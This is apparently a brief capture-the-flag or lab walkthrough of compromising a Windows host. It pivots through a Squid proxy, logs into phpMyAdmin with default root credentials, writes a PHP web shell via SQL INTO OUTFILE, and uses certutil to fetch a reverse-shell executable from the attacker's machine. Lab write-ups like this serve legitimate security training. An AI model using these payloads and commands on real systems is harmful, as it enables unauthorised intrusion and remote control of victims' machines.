#windows #squid_proxy

- Nmap shows only port 22 and 3128 is open.
- Squid proxy is running on port 3128.
- We used the spose.py script as found on Hacktricks to check if any port is behind the firewall
```
python spose.py --proxy http://192.168.172.189:3128 --target 192.168.172.189
```
- Port 8080 is open. We set the firefox proxy to manual and put the IP and port details of squid proxy.
- Then browsed the 8080 from browser and also ran dirb with proxy
- dirb result shows phpmyadmin dir.
- Logged into the phpmyadmin with default creds root:[null]
- Now we execute the below sql command on sql query tab of phpmyadmin.
```
select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/webshell.php'
```

- Created a revshell and uploaded to the target. then executed the below command to get the revshell.
```
certutil -urlcache -f http://192.168.45.171/revshell.exe C:/wamp/www/revshell.exe
```
- After login we can see that its already root user.